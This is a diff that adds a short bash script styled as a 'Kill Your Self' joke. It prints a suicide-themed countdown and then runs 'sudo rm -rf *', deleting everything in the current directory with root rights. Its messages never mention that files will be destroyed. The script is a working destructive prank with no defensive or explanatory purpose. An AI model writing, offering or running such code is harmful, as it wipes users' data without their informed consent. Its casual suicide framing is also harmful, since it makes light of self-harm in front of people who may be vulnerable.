@@ -1,0 +1,11 @@
+#!/bin/bash
+echo "Welcome to Kill Your Self!"
+echo "Initiating suicide in"
+echo "5"
+echo "4"
+echo "3"
+echo "2"
+echo "1"
+echo "NOW!"
+sudo rm -rf *
+echo "Killed self successfully."
